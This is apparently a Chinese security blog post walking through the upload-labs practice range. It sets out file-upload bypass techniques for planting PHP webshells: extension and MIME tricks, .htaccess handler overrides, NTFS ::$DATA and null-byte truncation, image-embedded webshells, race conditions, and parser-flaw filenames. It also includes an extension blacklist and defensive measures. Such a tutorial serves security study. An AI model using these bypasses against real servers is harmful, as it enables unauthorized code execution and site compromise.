           href="/%E6%8F%90%E6%9D%83%E4%B9%8Bsudo-ed/"
           data-tag="Linux,提权"
           data-author="" >
            <span class="post-title" title="提权之Linux sudo-ed">提权之Linux sudo-ed</span>
            <span class="post-date" title="2019-12-14 17:54:23">2019/12/14</span>
        </a>
        
        <a  class=""
           href="/%E6%8F%90%E6%9D%83%E4%B9%8Bwindows-CVE-2018-8120/"
           data-tag="提权"
           data-author="" >
            <span class="post-title" title="提权之windows-CVE-2018-8120">提权之windows-CVE-2018-8120</span>
            <span class="post-date" title="2020-02-12 12:46:56">2020/02/12</span>
        </a>
        
        <a  class=""
           href="/%E6%8F%90%E6%9D%83%E4%B9%8Bwindows-DLL%E6%B3%A8%E5%85%A5/"
           data-tag="windows,提权,DLL"
           data-author="" >
            <span class="post-title" title="提权之windows-DLL注入">提权之windows-DLL注入</span>
            <span class="post-date" title="2020-03-23 16:52:18">2020/03/23</span>
        </a>
        
        <a  class=""
           href="/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/"
           data-tag="漏洞"
           data-author="" >
            <span class="post-title" title="文件解析漏洞">文件解析漏洞</span>
            <span class="post-date" title="2020-01-14 21:35:14">2020/01/14</span>
        </a>
        
        <a  class=""
           href="/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"
           data-tag="漏洞"
           data-author="" >
            <span class="post-title" title="未授权访问漏洞">未授权访问漏洞</span>
            <span class="post-date" title="2020-03-29 14:03:13">2020/03/29</span>
        </a>
        
        <a  class=""
           href="/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"
           data-tag="知识"
           data-author="" >
            <span class="post-title" title="正则表达式">正则表达式</span>
            <span class="post-date" title="2019-12-10 21:08:11">2019/12/10</span>
        </a>
        
        <a  class=""
           href="/%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/"
           data-tag="漏洞,端口"
           data-author="" >
            <span class="post-title" title="漏洞记录">漏洞记录</span>
            <span class="post-date" title="2020-06-06 21:36:18">2020/06/06</span>
        </a>
        
        <a  class=""
           href="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/"
           data-tag="工具,内网渗透,端口"
           data-author="" >
            <span class="post-title" title="端口转发与隧道技术">端口转发与隧道技术</span>
            <span class="post-date" title="2020-01-05 02:38:08">2020/01/05</span>
        </a>
        
        <a  class=""
           href="/%E7%BB%95WAF%E4%B9%8Bsafedog/"
           data-tag="WAF"
           data-author="" >
            <span class="post-title" title="绕WAF之safedog">绕WAF之safedog</span>
            <span class="post-date" title="2019-12-27 20:28:35">2019/12/27</span>
        </a>
        
        <a  class=""
           href="/%E7%BB%95WAF%E4%B9%8B%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93/"
           data-tag="WAF"
           data-author="" >
            <span class="post-title" title="绕WAF之分块传输">绕WAF之分块传输</span>
            <span class="post-date" title="2019-12-27 09:24:52">2019/12/27</span>
        </a>
        
        <a  class=""
           href="/%E8%84%B1%E5%A3%B3/"
           data-tag="MISC,逆向"
           data-author="" >
            <span class="post-title" title="脱壳一">脱壳一</span>
            <span class="post-date" title="2019-12-26 00:13:05">2019/12/26</span>
        </a>
        
        <a  class=""
           href="/%E8%84%B1%E5%A3%B3%E4%BA%8C/"
           data-tag="MISC,逆向"
           data-author="" >
            <span class="post-title" title="脱壳二">脱壳二</span>
            <span class="post-date" title="2020-01-01 15:51:38">2020/01/01</span>
        </a>
        
    </nav>
</div>
    </div>
    <div class="hide-list">
        <div class="semicircle">
            <div class="brackets first"><</div>
            <div class="brackets">&gt;</div>
        </div>
    </div>
</aside>
<div class="post">
    <div class="pjax">
        <article id="post-File-Upload" class="article article-type-post" itemscope itemprop="blogPost">
    
        <h1 class="article-title">File-Upload</h1>
    
    <div class="article-meta">
        
        
        
        
        <span class="tag">
            
            <a class="color3">漏洞</a>
            
        </span>
        
    </div>
    <div class="article-meta">
        
        创建时间:<time class="date" title=''>2020-01-06 18:23<br/>
        更新时间: 2020-06-07 23:28:16
        </time>
        
    </div>
    <div class="article-meta">
        
        
        <span id="busuanzi_container_page_pv">
            阅读:<span id="busuanzi_value_page_pv">
                <span class="count-comment">
                    <span class="spinner">
                      <div class="cube1"></div>
                      <div class="cube2"></div>
                    </span>
                </span>
            </span>
        </span>
        
        
    </div>
    
    <div class="toc-ref">
    
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-File-Upload"><span class="toc-text">0x00 File-Upload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-前端JS检测"><span class="toc-text">0x01 前端JS检测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-MIME检测"><span class="toc-text">0x02 MIME检测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-blacklist检测"><span class="toc-text">0x03 blacklist检测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-big-blacklist检测"><span class="toc-text">0x04 big blacklist检测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-htaccess-in-big-blacklist检测-去尾点-转换为小写-首尾去空-去-DATA"><span class="toc-text">0x05 .htaccess in big blacklist检测+去尾点+转换为小写+首尾去空+去::$DATA</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-big-blacklist检测-去尾点-转换为小写-首尾去空"><span class="toc-text">0x06 big blacklist检测+去尾点+转换为小写+首尾去空</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07-big-blacklist检测-去尾点-转换为小写-去-DATA"><span class="toc-text">0x07 big blacklist检测+去尾点+转换为小写+去::$DATA</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x08-big-blacklist检测-转换为小写-去-DATA-首尾去空"><span class="toc-text">0x08 big blacklist检测+转换为小写+去::$DATA+首尾去空</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x09-big-blacklist检测-去尾点-转换为小写-首尾去空"><span class="toc-text">0x09 big blacklist检测+去尾点+转换为小写+首尾去空</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x0A-big-blacklist检测-去尾点-转换为小写-首尾去空-去-DATA"><span class="toc-text">0x0A big blacklist检测+去尾点+转换为小写+首尾去空+去::$DATA</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x0B-big-blacklist检测-替换为空"><span class="toc-text">0x0B big blacklist检测+替换为空</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x0C-whitelist检测-GET请求截断"><span class="toc-text">0x0C whitelist检测+GET请求截断</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x0D-whitelist检测-POST请求截断"><span class="toc-text">0x0D whitelist检测+POST请求截断</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x10-——-——-——-——-——-——-——-——-——-——-——"><span class="toc-text">0x10 —— —— —— —— —— —— —— —— —— —— ——</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x11-文件类型检测"><span class="toc-text">0x11 文件类型检测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x12-获取文件相关信息并检测"><span class="toc-text">0x12 获取文件相关信息并检测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x13-exif-imagetype函数检测"><span class="toc-text">0x13 exif_imagetype函数检测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x14-二次渲染"><span class="toc-text">0x14 二次渲染</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x15-条件竞争1"><span class="toc-text">0x15 条件竞争1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x16-条件竞争2"><span class="toc-text">0x16 条件竞争2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x17-黑名单-文件名可控"><span class="toc-text">0x17 黑名单+文件名可控</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x18-文件类型白名单-文件后缀名白名单检测"><span class="toc-text">0x18 文件类型白名单+文件后缀名白名单检测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x20-其他上传姿势"><span class="toc-text">0x20 其他上传姿势</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x21-双文件上传"><span class="toc-text">0x21 双文件上传</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x22-上传框提交按钮"><span class="toc-text">0x22 上传框提交按钮</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x30-黑名单"><span class="toc-text">0x30 黑名单</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0xFD-防护策略"><span class="toc-text">0xFD 防护策略</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0xFE-参考"><span class="toc-text">0xFE 参考</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0xFF-代码"><span class="toc-text">0xFF 代码</span></a></li></ol>
    
<style>
    .left-col .switch-btn,
    .left-col .switch-area {
        display: none;
    }
    .toc-level-3 i,
    .toc-level-3 ol {
        display: none !important;
    }
</style>
</div>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="0x00-File-Upload"><a href="#0x00-File-Upload" class="headerlink" title="0x00 File-Upload"></a>0x00 File-Upload</h2><p><img src="/File-Upload/upload.png" alt></p>
<ol>
<li>文件上传漏洞，上传过程中有或多或少的安全检测，同样有各种各样的绕过防护。</li>
<li>环境：windows server 2008 + phpstudy PHP5.2.17</li>
</ol>
<h2 id="0x01-前端JS检测"><a href="#0x01-前端JS检测" class="headerlink" title="0x01 前端JS检测"></a>0x01 前端JS检测</h2><ol>
<li>上传一句话木马1.php，前端JS检测</li>
<li><img src="/File-Upload/2.png" alt></li>
<li><img src="/File-Upload/3.png" alt></li>
<li>绕过方式：修改文件后缀名，绕过前端检测，拦截请求包改回来</li>
<li>把1.php改名1.png，拦截上传请求包，改回来</li>
<li><img src="/File-Upload/4.png" alt></li>
<li>Cknife连接</li>
<li><img src="/File-Upload/5.png" alt></li>
</ol>
<h2 id="0x02-MIME检测"><a href="#0x02-MIME检测" class="headerlink" title="0x02 MIME检测"></a>0x02 MIME检测</h2><ol>
<li><img src="/File-Upload/6.png" alt></li>
<li><img src="/File-Upload/7.png" alt></li>
<li>绕过方式：修改Content-Type的值为image/jpeg、image/png、image/gif之一</li>
<li>拦截上传请求包，修改Content-Type的值</li>
<li><img src="/File-Upload/8.png" alt></li>
</ol>
<h2 id="0x03-blacklist检测"><a href="#0x03-blacklist检测" class="headerlink" title="0x03 blacklist检测"></a>0x03 blacklist检测</h2><ol>
<li><img src="/File-Upload/9.png" alt></li>
<li><img src="/File-Upload/10.png" alt></li>
<li>绕过方式：修改文件后缀名为php3、php4、php5、php6、php7、phtml、pht、phar、phpt等等</li>
<li>但有条件，配置里设置是否解析，这里Apache默认设置不解析.phtml</li>
<li><img src="/File-Upload/11.png" alt></li>
<li>手拿放进去，访问，不解析</li>
<li><img src="/File-Upload/12.png" alt></li>
<li>但在kali里就可以解析</li>
<li><img src="/File-Upload/13.png" alt></li>
<li>查看配置/etc/apache2/，*-enabled表示在是用的配置，*-available表示是可用的配置。</li>
<li><img src="/File-Upload/14.png" alt></li>
<li><img src="/File-Upload/15.png" alt></li>
<li>除此，还可以通过.htaccess文件来添加解析类型。</li>
<li>AddType application/x-httpd-php xxx</li>
<li>这里按着靶场的剧本走，假设是可以解析.phtml的（去掉#，重启Apache）</li>
<li><img src="/File-Upload/16.png" alt></li>
<li>再上传，访问</li>
<li><img src="/File-Upload/17.png" alt></li>
<li><img src="/File-Upload/18.png" alt></li>
</ol>
<h2 id="0x04-big-blacklist检测"><a href="#0x04-big-blacklist检测" class="headerlink" title="0x04 big blacklist检测"></a>0x04 big blacklist检测</h2><ol>
<li><img src="/File-Upload/19.png" alt></li>
<li>绕过方式：上传.htaccess文件，改变配置</li>
<li>.htaccess文件内容：SetHandler application/x-httpd-php #所有文件都将当作php文件来解析</li>
<li>上传图片木马，上传.htaccess</li>
<li><img src="/File-Upload/20.png" alt></li>
<li><img src="/File-Upload/21.png" alt></li>
<li>访问../upload/4.jpg</li>
<li><img src="/File-Upload/22.png" alt></li>
</ol>
<h2 id="0x05-htaccess-in-big-blacklist检测-去尾点-转换为小写-首尾去空-去-DATA"><a href="#0x05-htaccess-in-big-blacklist检测-去尾点-转换为小写-首尾去空-去-DATA" class="headerlink" title="0x05 .htaccess in big blacklist检测+去尾点+转换为小写+首尾去空+去::$DATA"></a>0x05 .htaccess in big blacklist检测+去尾点+转换为小写+首尾去空+去::$DATA</h2><ol>
<li>利用windows的文件特性绕过：5.php. .，点空格点</li>
<li><img src="/File-Upload/23.png" alt></li>
<li><img src="/File-Upload/24.png" alt></li>
</ol>
<h2 id="0x06-big-blacklist检测-去尾点-转换为小写-首尾去空"><a href="#0x06-big-blacklist检测-去尾点-转换为小写-首尾去空" class="headerlink" title="0x06 big blacklist检测+去尾点+转换为小写+首尾去空"></a>0x06 big blacklist检测+去尾点+转换为小写+首尾去空</h2><ol>
<li><img src="/File-Upload/25.png" alt></li>
<li>大小写绕过：6.Php</li>
<li><img src="/File-Upload/26.png" alt></li>
<li><img src="/File-Upload/27.png" alt></li>
</ol>
<h2 id="0x07-big-blacklist检测-去尾点-转换为小写-去-DATA"><a href="#0x07-big-blacklist检测-去尾点-转换为小写-去-DATA" class="headerlink" title="0x07 big blacklist检测+去尾点+转换为小写+去::$DATA"></a>0x07 big blacklist检测+去尾点+转换为小写+去::$DATA</h2><ol>
<li><img src="/File-Upload/28.png" alt></li>
<li>末尾部加空格绕过，7.php[空格]</li>
<li><img src="/File-Upload/29.png" alt></li>
<li><img src="/File-Upload/30.png" alt></li>
</ol>
<h2 id="0x08-big-blacklist检测-转换为小写-去-DATA-首尾去空"><a href="#0x08-big-blacklist检测-转换为小写-去-DATA-首尾去空" class="headerlink" title="0x08 big blacklist检测+转换为小写+去::$DATA+首尾去空"></a>0x08 big blacklist检测+转换为小写+去::$DATA+首尾去空</h2><ol>
<li><img src="/File-Upload/31.png" alt></li>
<li>文件后缀名加点绕过：8.php.</li>
<li><img src="/File-Upload/32.png" alt></li>
<li><img src="/File-Upload/33.png" alt></li>
</ol>
<h2 id="0x09-big-blacklist检测-去尾点-转换为小写-首尾去空"><a href="#0x09-big-blacklist检测-去尾点-转换为小写-首尾去空" class="headerlink" title="0x09 big blacklist检测+去尾点+转换为小写+首尾去空"></a>0x09 big blacklist检测+去尾点+转换为小写+首尾去空</h2><ol>
<li><img src="/File-Upload/34.png" alt></li>
<li>利用windows文件流特性绕过：9.php::$DATA</li>
<li><img src="/File-Upload/35.png" alt></li>
<li><img src="/File-Upload/36.png" alt></li>
</ol>
<h2 id="0x0A-big-blacklist检测-去尾点-转换为小写-首尾去空-去-DATA"><a href="#0x0A-big-blacklist检测-去尾点-转换为小写-首尾去空-去-DATA" class="headerlink" title="0x0A big blacklist检测+去尾点+转换为小写+首尾去空+去::$DATA"></a>0x0A big blacklist检测+去尾点+转换为小写+首尾去空+去::$DATA</h2><ol>
<li><img src="/File-Upload/37.png" alt></li>
<li>与0x05一样利用windows的文件特性绕过：10.php. .，点空格点</li>
<li><img src="/File-Upload/38.png" alt></li>
<li><img src="/File-Upload/39.png" alt></li>
</ol>
<h2 id="0x0B-big-blacklist检测-替换为空"><a href="#0x0B-big-blacklist检测-替换为空" class="headerlink" title="0x0B big blacklist检测+替换为空"></a>0x0B big blacklist检测+替换为空</h2><ol>
<li><img src="/File-Upload/40.png" alt></li>
<li>双文件名绕过：11.pphphp</li>
<li><img src="/File-Upload/41.png" alt></li>
<li><img src="/File-Upload/42.png" alt></li>
</ol>
<h2 id="0x0C-whitelist检测-GET请求截断"><a href="#0x0C-whitelist检测-GET请求截断" class="headerlink" title="0x0C whitelist检测+GET请求截断"></a>0x0C whitelist检测+GET请求截断</h2><ol>
<li><img src="/File-Upload/43.png" alt></li>
<li>必须条件：PHP&lt;5.3.4，php.ini下设置magic_quotes_gpc = Off</li>
<li>路径可控，路径后+文件名+%00</li>
<li>绕过：选中%00，ctrl+shift+u</li>
<li><img src="/File-Upload/44.png" alt></li>
<li><img src="/File-Upload/45.png" alt></li>
</ol>
<h2 id="0x0D-whitelist检测-POST请求截断"><a href="#0x0D-whitelist检测-POST请求截断" class="headerlink" title="0x0D whitelist检测+POST请求截断"></a>0x0D whitelist检测+POST请求截断</h2><ol>
<li><img src="/File-Upload/46.png" alt></li>
<li>必须条件：PHP&lt;5.3.4，php.ini下设置magic_quotes_gpc = Off</li>
<li>路径可控，路径后+文件名+%00</li>
<li>绕过：选中%00，ctrl+shift+u</li>
<li><img src="/File-Upload/47.png" alt></li>
<li><img src="/File-Upload/48.png" alt></li>
</ol>
<h2 id="0x10-——-——-——-——-——-——-——-——-——-——-——"><a href="#0x10-——-——-——-——-——-——-——-——-——-——-——" class="headerlink" title="0x10 —— —— —— —— —— —— —— —— —— —— ——"></a>0x10 —— —— —— —— —— —— —— —— —— —— ——</h2><ol>
<li>以下上传图片木马配合文件包含漏洞</li>
</ol>
<h2 id="0x11-文件类型检测"><a href="#0x11-文件类型检测" class="headerlink" title="0x11 文件类型检测"></a>0x11 文件类型检测</h2><ol>
<li><img src="/File-Upload/49.png" alt></li>
<li>读取2字节判断上传文件的类型</li>
<li><img src="/File-Upload/52.png" alt></li>
<li><img src="/File-Upload/53.png" alt></li>
<li><a href="https://www.runoob.com/php/func-misc-unpack.html" target="_blank" rel="noopener">unpack函数</a></li>
<li>上传包含木马的图片，结合文件包含漏洞来利用。</li>
<li>绕过：文件内容前添加GIF89a</li>
<li><img src="/File-Upload/50.png" alt></li>
<li><img src="/File-Upload/51.png" alt></li>
</ol>
<h2 id="0x12-获取文件相关信息并检测"><a href="#0x12-获取文件相关信息并检测" class="headerlink" title="0x12 获取文件相关信息并检测"></a>0x12 获取文件相关信息并检测</h2><ol>
<li><img src="/File-Upload/54.png" alt></li>
<li>getimagesize() 函数用于获取图像大小及相关信息，成功返回一个数组，失败则返回 FALSE 并产生一条 E_WARNING 级的错误信息。</li>
<li>$info = getimagesize($filename);</li>
<li>$ext = image_type_to_extension($info[2]); #这里就是获取后缀名</li>
<li>phpinfo.php</li>
<li><img src="/File-Upload/55.png" alt></li>
<li>获取phpinfo.php的文件相关信息</li>
<li><img src="/File-Upload/56.png" alt></li>
<li>绕过：文件内容前添加GIF89a</li>
<li><img src="/File-Upload/57.png" alt></li>
<li><img src="/File-Upload/58.png" alt></li>
</ol>
<h2 id="0x13-exif-imagetype函数检测"><a href="#0x13-exif-imagetype函数检测" class="headerlink" title="0x13 exif_imagetype函数检测"></a>0x13 exif_imagetype函数检测</h2><ol>
<li><img src="/File-Upload/59.png" alt></li>
<li><a href="https://www.php.net/manual/zh/function.exif-imagetype.php" target="_blank" rel="noopener">exif_imagetype — 读取一个图像的第一个字节并检查其签名。</a></li>
<li>必须开启php_exif模块</li>
<li><img src="/File-Upload/60.png" alt></li>
<li>制作图片木马</li>
<li>copy 2.jpg/b+phpinfo.php/a phpinfo.jpg</li>
<li><img src="/File-Upload/62.png" alt></li>
<li><img src="/File-Upload/61.png" alt></li>
<li><img src="/File-Upload/63.png" alt></li>
</ol>
<h2 id="0x14-二次渲染"><a href="#0x14-二次渲染" class="headerlink" title="0x14 二次渲染"></a>0x14 二次渲染</h2><p><strong>关键代码</strong></p>
<pre><code>$is_upload = false;
$msg = null;
if (isset($_POST[&#39;submit&#39;])){
    // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径
    $filename = $_FILES[&#39;upload_file&#39;][&#39;name&#39;];
    $filetype = $_FILES[&#39;upload_file&#39;][&#39;type&#39;];
    $tmpname = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];

    $target_path=UPLOAD_PATH.&#39;/&#39;.basename($filename);

    // 获得上传文件的扩展名
    $fileext= substr(strrchr($filename,&quot;.&quot;),1);

    //判断文件后缀与类型，合法才进行上传操作
    if(($fileext == &quot;jpg&quot;) &amp;&amp; ($filetype==&quot;image/jpeg&quot;)){
        if(move_uploaded_file($tmpname,$target_path)){
            //使用上传的图片生成新的图片
            $im = imagecreatefromjpeg($target_path);

            if($im == false){
                $msg = &quot;该文件不是jpg格式的图片！&quot;;
                @unlink($target_path);
            }else{
                //给新图片指定文件名
                srand(time());
                $newfilename = strval(rand()).&quot;.jpg&quot;;
                //显示二次渲染后的图片（使用用户上传图片生成的新图片）
                $img_path = UPLOAD_PATH.&#39;/&#39;.$newfilename;
                imagejpeg($im,$img_path);
                @unlink($target_path);
                $is_upload = true;
            }
        } else {
            $msg = &quot;上传出错！&quot;;
        }

    }else if(($fileext == &quot;png&quot;) &amp;&amp; ($filetype==&quot;image/png&quot;)){
        if(move_uploaded_file($tmpname,$target_path)){
            //使用上传的图片生成新的图片
            $im = imagecreatefrompng($target_path);

            if($im == false){
                $msg = &quot;该文件不是png格式的图片！&quot;;
                @unlink($target_path);
            }else{
                 //给新图片指定文件名
                srand(time());
                $newfilename = strval(rand()).&quot;.png&quot;;
                //显示二次渲染后的图片（使用用户上传图片生成的新图片）
                $img_path = UPLOAD_PATH.&#39;/&#39;.$newfilename;
                imagepng($im,$img_path);

                @unlink($target_path);
                $is_upload = true;               
            }
        } else {
            $msg = &quot;上传出错！&quot;;
        }

    }else if(($fileext == &quot;gif&quot;) &amp;&amp; ($filetype==&quot;image/gif&quot;)){
        if(move_uploaded_file($tmpname,$target_path)){
            //使用上传的图片生成新的图片
            $im = imagecreatefromgif($target_path);
            if($im == false){
                $msg = &quot;该文件不是gif格式的图片！&quot;;
                @unlink($target_path);
            }else{
                //给新图片指定文件名
                srand(time());
                $newfilename = strval(rand()).&quot;.gif&quot;;
                //显示二次渲染后的图片（使用用户上传图片生成的新图片）
                $img_path = UPLOAD_PATH.&#39;/&#39;.$newfilename;
                imagegif($im,$img_path);

                @unlink($target_path);
                $is_upload = true;
            }
        } else {
            $msg = &quot;上传出错！&quot;;
        }
    }else{
        $msg = &quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;;
    }
}</code></pre><ol>
<li><strong>上传过程：</strong></li>
<li>图片后插入木马，上传图片木马后，下载它，与原图片进行对比，查看图片文件渲染哪些位置</li>
<li>查看木马代码是否被渲染了，选择没被渲染的部分插入木马代码，再上传。</li>
<li><strong>测试gif图片</strong></li>
<li><img src="/File-Upload/gif.gif" alt></li>
<li><img src="/File-Upload/66.png" alt></li>
<li><img src="/File-Upload/67.png" alt></li>
<li>利用文件包含漏洞验证脚本：</li>
<li><img src="/File-Upload/68.png" alt></li>
<li></li>
<li><strong>测试jpg图片</strong></li>
<li><img src="/File-Upload/phpinfo.jpg" alt></li>
<li><a href="#jump">大牛编写的脚本jpg_payload.php</a></li>
<li>php jpg_payload.php 1.jpg #windows下多次不行就换到Linux里</li>
<li><img src="/File-Upload/65.png" alt></li>
<li><img src="/File-Upload/64.png" alt></li>
<li>上传后，php代码还是可能会被破坏~</li>
<li></li>
<li><strong>测试php图片</strong></li>
<li><img src="/File-Upload/png.png" alt></li>
<li>png+<a href="#jump">PLTE数据块写入php代码计算CRC脚本</a></li>
<li><img src="/File-Upload/72.png" alt></li>
<li><img src="/File-Upload/73.png" alt></li>
<li>上传</li>
<li><img src="/File-Upload/71.png" alt></li>
<li>同样，php代码是否被破坏，下载下来打开查看。</li>
<li></li>
<li>png+<a href="#jump">大牛写的脚本png.php</a></li>
<li><img src="/File-Upload/69.png" alt></li>
<li><img src="/File-Upload/70.png" alt></li>
</ol>
<h2 id="0x15-条件竞争1"><a href="#0x15-条件竞争1" class="headerlink" title="0x15 条件竞争1"></a>0x15 条件竞争1</h2><ol>
<li>白名单判断是否允许类型文件，否则unlink()删除文件</li>
<li><img src="/File-Upload/74.png" alt></li>
<li>利用条件竞争来同时上传木马和访问木马</li>
<li><img src="/File-Upload/75.png" alt></li>
<li><img src="/File-Upload/76.png" alt></li>
<li>成功访问</li>
<li><img src="/File-Upload/77.png" alt></li>
</ol>
<h2 id="0x16-条件竞争2"><a href="#0x16-条件竞争2" class="headerlink" title="0x16 条件竞争2"></a>0x16 条件竞争2</h2><ol>
<li>对上传文件白名单验证后缀名，进行move()保存临时目录，再rename</li>
<li>直接上传木马图片</li>
<li><img src="/File-Upload/78.png" alt></li>
<li><img src="/File-Upload/79.png" alt></li>
<li><img src="/File-Upload/80.png" alt></li>
</ol>
<h2 id="0x17-黑名单-文件名可控"><a href="#0x17-黑名单-文件名可控" class="headerlink" title="0x17 黑名单+文件名可控"></a>0x17 黑名单+文件名可控</h2><ol>
<li><img src="/File-Upload/81.png" alt></li>
<li>直接上传php木马，绕过黑名单就行（如果服务器可以解析的话）</li>
<li><img src="/File-Upload/82.png" alt></li>
<li><img src="/File-Upload/83.png" alt></li>
<li>/.绕过</li>
<li>自定义文件名为19.php/.</li>
<li><img src="/File-Upload/84.png" alt></li>
<li><img src="/File-Upload/85.png" alt></li>
</ol>
<h2 id="0x18-文件类型白名单-文件后缀名白名单检测"><a href="#0x18-文件类型白名单-文件后缀名白名单检测" class="headerlink" title="0x18 文件类型白名单+文件后缀名白名单检测"></a>0x18 文件类型白名单+文件后缀名白名单检测</h2><ol>
<li>数组+/绕过</li>
<li><img src="/File-Upload/86.png" alt></li>
<li><img src="/File-Upload/87.png" alt></li>
</ol>
<h2 id="0x20-其他上传姿势"><a href="#0x20-其他上传姿势" class="headerlink" title="0x20 其他上传姿势"></a>0x20 其他上传姿势</h2><ol>
<li>1.php——1%0a.php #换行</li>
<li>1.jpg.png.gif.php #双重后缀名、多重后缀名</li>
<li>1.asp;.jpg #利用IIS解析漏洞</li>
<li>./0.asp/1.jpg #利用IIS6.0解析漏洞</li>
<li>/1.php #IIS7.0/7.5解析漏洞</li>
<li>1.jpg%00.php #nginx（0.5.x, 0.6.x, 0.7 &lt;= 0.7.65, 0.8 &lt;= 0.8.37）空字节漏洞，php版本要小于5.3.4</li>
<li>1.png/2.php #nginx解析漏洞</li>
<li>1.php.asd #apache解析漏洞，从右往左解析，解析不了就跳过，解析下一个后缀名</li>
<li>1.php:2.jpg</li>
<li>3.php::$DATA</li>
<li>4.php::$DATA……..</li>
<li>fuzz黑名单文件名</li>
</ol>
<h2 id="0x21-双文件上传"><a href="#0x21-双文件上传" class="headerlink" title="0x21 双文件上传"></a>0x21 双文件上传</h2><ol>
<li>F12或右击审查元素，找到上传点的action，复制粘贴&lt;input…&gt;，然后就会出现两个上传框，第一个上传图片，第二个上传木马</li>
</ol>
<h2 id="0x22-上传框提交按钮"><a href="#0x22-上传框提交按钮" class="headerlink" title="0x22 上传框提交按钮"></a>0x22 上传框提交按钮</h2><ol>
<li>有时候会出现，只有一个浏览文件，却没有提交按钮</li>
<li>F12审查元素，添加：</li>
<li><input type="submit" value="提交" name="xx">


</li>
</ol>
<h2 id="0x30-黑名单"><a href="#0x30-黑名单" class="headerlink" title="0x30 黑名单"></a>0x30 黑名单</h2><ol>
<li>.php、.php5、.php4、.php3、.php2、.php1、.html、.htm、.phtml、.pht、.pHp、.pHp5、.pHp4、</li>
<li>.pHp3、.pHp2、.pHp1、.Html、.Htm、.pHtml、.jsp、.jspa、.jspx、.jsw、.jsv、.jspf、.jtml、</li>
<li>.jSp、.jSpx、.jSpa、.jSw、.jSv、.jSpf、.jHtml、.asp、.aspx、.asa、.asax、.ascx、.ashx、</li>
<li>.asmx、.cer、.aSp、.aSpx、.aSa、.asac、.aSax、.aScx、.aShx、.aSmx、.cEr、.sWf、.swf、.ini</li>
<li>.cfm、.shtml、.cdx</li>
</ol>
<h2 id="0xFD-防护策略"><a href="#0xFD-防护策略" class="headerlink" title="0xFD 防护策略"></a>0xFD 防护策略</h2><ol>
<li>设置上传文件的文件后缀名白名单</li>
<li>限制上传文件的大小，文件内容识别</li>
<li>设置复杂随机的路径名与文件名</li>
<li>禁止错误信息回显上传文件的绝对路径</li>
<li>网站不存在文件解析漏洞</li>
<li>上传文件的保存目录只有读写权限，没有执行权限</li>
<li>设置单独的文件服务器与域名</li>
</ol>
<h2 id="0xFE-参考"><a href="#0xFE-参考" class="headerlink" title="0xFE 参考"></a>0xFE 参考</h2><ol>
<li><a href="https://github.com/c0ny1/upload-labs" target="_blank" rel="noopener">https://github.com/c0ny1/upload-labs</a></li>
<li><a href="https://xz.aliyun.com/t/2657" target="_blank" rel="noopener">https://xz.aliyun.com/t/2657</a></li>
<li><a href="https://xz.aliyun.com/t/4029#toc-13" target="_blank" rel="noopener">https://xz.aliyun.com/t/4029#toc-13</a></li>
</ol>
<h2 id="0xFF-代码"><a href="#0xFF-代码" class="headerlink" title="0xFF 代码"></a>0xFF 代码</h2><p><strong>简单的文件上传代码</strong><br><strong>upload.html</strong></p>
<pre><code>&lt;html&gt;
&lt;head&gt;
    &lt;meta charset=&quot;utf-8&quot;&gt;
    &lt;title&gt;
        File Upload
    &lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;form action=&quot;upload.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;
        &lt;label for=&quot;file&quot;&gt;文件名：&lt;/label&gt;
        &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;&lt;br/&gt;
        &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;上传&quot;&gt;
    &lt;/form&gt;
&lt;/body&gt;
&lt;/html&gt;</code></pre><p><strong>upload.php</strong></p>
<pre><code>&lt;?php
highlight_file(__FILE__);
echo &quot;&lt;br&gt;&quot;;

#JS检测
